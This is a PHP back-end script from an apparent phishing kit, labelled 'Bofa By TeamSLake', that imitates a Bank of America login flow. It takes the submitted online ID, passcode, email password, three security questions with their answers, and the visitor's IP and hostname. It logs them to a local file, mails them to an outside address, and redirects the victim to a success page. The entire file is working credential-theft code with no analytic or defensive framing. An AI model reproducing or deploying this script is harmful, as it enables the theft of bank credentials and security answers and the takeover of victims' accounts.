<?
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$msg .= "\n";
$msg .= "OnlineId : ".$_POST['onlineId1']."\n";
$msg .= "Passcode : ".$_POST['passcode1']."\n";
$msg .= "\n";
$msg .= "Email : ".$_POST['email']."\n";
$msg .= "Password : ".$_POST['pass']."\n";
$msg .= "\n";
$msg .= "Question 1 : ".$_POST['q1']."\n";
$msg .= "Answer : ".$_POST['a1']."\n";
$msg .= "Question 2 : ".$_POST['q2']."\n";
$msg .= "Answer : ".$_POST['a2']."\n";
$msg .= "Question 3 : ".$_POST['q3']."\n";
$msg .= "Answer : ".$_POST['a3']."\n";
$msg .= "IP: ".$ip."\n";
$msg .= "HostName: ".$hostname."\n";
$msg .= "\n";
$message .= "--------------Bofa By TeamSLake------------\n\n";
$post = "rzltmarch@eservicesincl.website";
$fp = fopen("use.txt","a");
fputs($fp,$msg);
fclose($fp);
$subj = "$ip - : ".$_POST['onlineId1']."\n";
$from = "From: Bofa<rzltmarch@eservicesincl.website>";
mail("$post",$subj, $msg, $from);
header("Location:  success.htm");  

?>